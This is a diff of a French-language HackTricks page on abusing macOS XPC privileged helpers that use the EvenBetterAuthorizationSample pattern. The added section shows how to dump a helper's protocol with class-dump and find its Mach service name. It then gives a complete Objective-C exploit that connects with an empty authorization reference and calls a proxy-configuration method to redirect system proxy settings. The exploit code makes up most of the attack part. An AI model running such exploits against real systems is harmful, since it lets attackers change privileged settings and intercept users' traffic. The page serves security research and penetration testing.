@@ -20,7 +20,7 @@ Lorsqu'une application a besoin d'**exécuter des actions en tant qu'utilisateur
 
 ### ShouldAcceptNewConnection toujours YES
 
-Un exemple peut être trouvé dans [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Dans `App/AppDelegate.m`, il essaie de **se connecter** au **HelperTool**. Et dans `HelperTool/HelperTool.m`, la fonction **`shouldAcceptNewConnection`** **ne vérifiera pas** les exigences indiquées précédemment. Elle renverra toujours YES :
+Un exemple peut être trouvé dans [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Dans `App/AppDelegate.m`, il essaie de **se connecter** au **HelperTool**. Et dans `HelperTool/HelperTool.m`, la fonction **`shouldAcceptNewConnection`** ne **vérifiera pas** les exigences indiquées précédemment. Elle renverra toujours YES :
 ```objectivec
 - (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
 // Called by our XPC listener when a new connection comes in.  We configure the connection
@@ -37,14 +37,14 @@ newConnection.exportedObject = self;
 return YES;
 }
 ```
-Pour plus d'informations sur la configuration appropriée de cette vérification, consultez le fichier [macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md).
+Pour plus d'informations sur la configuration appropriée de cette vérification, veuillez consulter le fichier [macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md).
 
 ### Droits d'application
 
-Cependant, une **autorisation est en cours lorsqu'une méthode du HelperTool est appelée**.
+Cependant, une **autorisation est requise lorsqu'une méthode du HelperTool est appelée**.
 
 La fonction **`applicationDidFinishLaunching`** du fichier `App/AppDelegate.m` créera une référence d'autorisation vide après le démarrage de l'application. Cela devrait toujours fonctionner.\
-Ensuite, il essaiera d'**ajouter certains droits** à cette référence d'autorisation en appelant `setupAuthorizationRights`:
+Ensuite, elle essaiera d'**ajouter certains droits** à cette référence d'autorisation en appelant `setupAuthorizationRights`:
 ```objectivec
 - (void)applicationDidFinishLaunching:(NSNotification *)note
 {
@@ -276,11 +276,155 @@ com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek,
 Rights with 'session-owner': 'true':
 authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
 ```
+## Réverser l'autorisation
+
+### Vérification de l'utilisation de EvenBetterAuthorization
+
+Si vous trouvez la fonction : **`[HelperTool checkAuthorization:command:]`**, il est probable que le processus utilise le schéma mentionné précédemment pour l'autorisation :
+
+<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Ainsi, si cette fonction appelle des fonctions telles que `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, elle utilise [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).
+
+Vérifiez le fichier **`/var/db/auth.db`** pour voir s'il est possible d'obtenir des autorisations pour appeler une action privilégiée sans interaction de l'utilisateur.
+
+### Communication de protocole
+
+Ensuite, vous devez trouver le schéma de protocole afin de pouvoir établir une communication avec le service XPC.
+
+La fonction **`shouldAcceptNewConnection`** indique le protocole qui est exporté :
+
+<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Dans ce cas, nous avons la même chose que dans EvenBetterAuthorizationSample, [**vérifiez cette ligne**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).
+
+En connaissant le nom du protocole utilisé, il est possible de **dumper sa définition d'en-tête** avec :
+```
+class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
+
+[...]
+@protocol HelperToolProtocol
+- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
+- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
+- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
+- (void)getVersionWithReply:(void (^)(NSString *))arg1;
+- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
+@end
+[...]
+```
+Enfin, nous devons simplement connaître le **nom du service Mach exposé** afin d'établir une communication avec celui-ci. Il existe plusieurs façons de le trouver :
+
+* Dans la méthode **`[HelperTool init]`**, où vous pouvez voir le service Mach utilisé :
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* Dans le fichier launchd plist :
+```
+cat /Library/LaunchDaemons/com.example.HelperTool.plist
+
+[...]
+
+<key>MachServices</key>
+<dict>
+<key>com.example.HelperTool</key>
+<true/>
+</dict>
+[...]
+```
+### Exemple d'exploitation
+
+Dans cet exemple, nous créons :
+
+* La définition du protocole avec les fonctions
+* Une authentification vide à utiliser pour demander l'accès
+* Une connexion au service XPC
+* Un appel à la fonction si la connexion a réussi
+```
+// gcc -framework Foundation -framework Security expl.m -o expl
+
+#import <Foundation/Foundation.h>
+#import <Security/Security.h>
+
+// Define a unique service name for the XPC helper
+static NSString* XPCServiceName = @"com.example.XPCHelper";
+
+// Define the protocol for the helper tool
+@protocol XPCHelperProtocol
+- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
+- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
+- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
+- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
+- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
+@end
+
+int main(void) {
+NSData *authData;
+OSStatus status;
+AuthorizationExternalForm authForm;
+AuthorizationRef authReference = {0};
+NSString *proxyAddress = @"127.0.0.1";
+NSString *proxyPort = @"4444";
+Boolean isProxyEnabled = true;
+
+// Create an empty authorization reference
+status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
+const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+
+// Convert the authorization reference to an external form
+if (status == errAuthorizationSuccess) {
+status = AuthorizationMakeExternalForm(authReference, &authForm);
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
+
+// Convert the external form to NSData for transmission
+if (status == errAuthorizationSuccess) {
+authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
+errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+NSLog(@"OSStatus: %s", errorMsg);
+}
+
+// Ensure the authorization was successful
+assert(status == errAuthorizationSuccess);
+
+// Establish an XPC connection
+NSString *serviceName = XPCServiceName;
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
+NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
+[xpcConnection setRemoteObjectInterface:xpcInterface];
+[xpcConnection resume];
+
+// Handle errors for the XPC connection
+id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
+NSLog(@"[-] Connection error");
+NSLog(@"[-] Error: %@", error);
+}];
+
+// Log the remote proxy and connection objects
+NSLog(@"Remote Proxy: %@", remoteProxy);
+NSLog(@"XPC Connection: %@", xpcConnection);
+
+// Use the legacy method to configure the proxy
+[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
+NSLog(@"Response: %@", error);
+}];
+
+// Allow some time for the operation to complete
+[NSThread sleepForTimeInterval:10.0f];
+
+NSLog(@"Finished!");
+}
+```
+## Références
+
+* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)
+
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
